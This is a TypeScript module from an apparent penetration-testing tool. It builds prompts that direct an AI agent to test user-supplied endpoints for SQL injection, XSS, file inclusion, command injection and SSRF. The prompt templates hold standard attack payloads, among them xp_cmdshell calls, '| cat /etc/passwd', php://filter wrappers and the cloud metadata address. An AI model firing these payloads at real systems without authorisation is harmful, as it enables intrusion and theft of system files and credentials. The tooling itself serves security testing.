import type { ActivitySuggestion } from './ActivityMonitorService';

export interface FocusedScanSuggestion extends Pick<ActivitySuggestion, 'type' | 'endpoints' | 'targetHosts'> {}

const ENDPOINTS_PLACEHOLDER = '__PENPARD_FOCUSED_ENDPOINTS__';

const FOCUSED_SCAN_PROMPTS: Record<string, string> = {
    sqli: `FOCUSED SQL INJECTION SCAN: The user was manually testing SQL injection on the following endpoints.
Your job is to quickly and efficiently test these endpoints with comprehensive SQLi payloads:
- Time-based blind: ' AND SLEEP(5)--, ' WAITFOR DELAY '0:0:5'--
- Boolean-based: ' AND '1'='1 vs ' AND '1'='2
- Error-based: ' AND 1=CONVERT(int,@@version)--
- UNION-based: ' UNION SELECT NULL,NULL--
- Stacked queries: '; EXEC xp_cmdshell('whoami')--

Endpoints to test:
${ENDPOINTS_PLACEHOLDER}

Be fast, focused and thorough. Test each parameter systematically.`,

    xss: `FOCUSED XSS SCAN: The user was manually testing Cross-Site Scripting.
Test these endpoints with comprehensive XSS payloads:
- Reflected: <script>alert(1)</script>, <img src=x onerror=alert(1)>
- DOM-based: javascript:alert(1), " onmouseover="alert(1)
- Stored: Check if payloads persist across requests
- Filter bypass: <ScRiPt>alert(1)</ScRiPt>, <svg/onload=alert(1)>
- Encoding bypass: &#60;script&#62;, %3Cscript%3E

Endpoints to test:
${ENDPOINTS_PLACEHOLDER}`,

    lfi: `FOCUSED LFI/PATH TRAVERSAL SCAN: The user was testing file inclusion.
Test these endpoints:
- Basic traversal: ../../etc/passwd, ....//....//etc/passwd
- Null byte: ../../../etc/passwd%00
- Double encoding: ..%252f..%252f..%252fetc/passwd
- PHP wrappers: php://filter/convert.base64-encode/resource=index.php
- Windows: ..\\..\\windows\\system32\\drivers\\etc\\hosts

Endpoints to test:
${ENDPOINTS_PLACEHOLDER}`,

    cmdi: `FOCUSED COMMAND INJECTION SCAN: The user was testing command injection.
Test these endpoints:
- Basic: ; ls, | cat /etc/passwd, \`id\`
- Blind: ; sleep 5, | ping -c 5 127.0.0.1
- Alternative: $( whoami ), \${IFS}cat\${IFS}/etc/passwd
- Windows: & dir, | type C:\\windows\\win.ini

Endpoints to test:
${ENDPOINTS_PLACEHOLDER}`,

    ssrf: `FOCUSED SSRF SCAN: The user was testing Server-Side Request Forgery.
Test these endpoints:
- Internal: http://127.0.0.1, http://localhost, http://[::1]
- Cloud metadata: http://169.254.169.254/latest/meta-data/
- DNS rebinding: Use alternative IP representations
- Protocol: file:///etc/passwd, gopher://, dict://

Endpoints to test:
${ENDPOINTS_PLACEHOLDER}`,
};

export function buildFocusedScanPrompt(suggestion: FocusedScanSuggestion): string {
    const endpoints = formatFocusedScanEndpoints(suggestion.endpoints);
    const template = FOCUSED_SCAN_PROMPTS[suggestion.type];

    if (!template) {
        return `Test the following endpoints for ${suggestion.type} vulnerabilities:\n${endpoints}`;
    }

    return template.replace(ENDPOINTS_PLACEHOLDER, endpoints);
}

export function resolveFocusedScanTarget(suggestion: FocusedScanSuggestion, fallback: string = 'target'): string {
    const hostTarget = suggestion.targetHosts.find((entry) => typeof entry === 'string' && entry.trim());
    if (hostTarget) {
        return hostTarget;
    }

    const endpointTarget = suggestion.endpoints.find((entry) => typeof entry === 'string' && entry.trim());
    if (endpointTarget) {
        return endpointTarget.split(' ').pop() || endpointTarget;
    }

    return fallback;
}

function formatFocusedScanEndpoints(endpoints: string[]): string {
    const formatted = endpoints
        .filter((endpoint) => typeof endpoint === 'string' && endpoint.trim())
        .join('\n');

    return formatted || '- none provided';
}
